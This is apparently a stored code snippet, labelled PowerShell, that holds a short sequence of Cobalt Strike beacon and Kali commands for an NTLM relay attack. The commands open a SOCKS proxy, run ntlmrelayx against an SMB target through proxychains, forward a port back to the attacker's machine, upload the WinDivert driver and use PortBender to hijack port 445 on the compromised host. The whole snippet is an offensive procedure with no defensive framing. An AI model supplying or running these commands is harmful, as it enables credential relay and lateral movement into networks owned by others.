---
id: 5af13ce1-f464-4024-af1c-54e77dd71906
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:16.815570+00:00'
updated_at: '2023-04-10T20:36:24.950723+00:00'
---

# Code Snippet 5af13ce1

**Language**: Powershell

```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
beacon> rportfwd_local 8445 <IP_KALI> 445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```
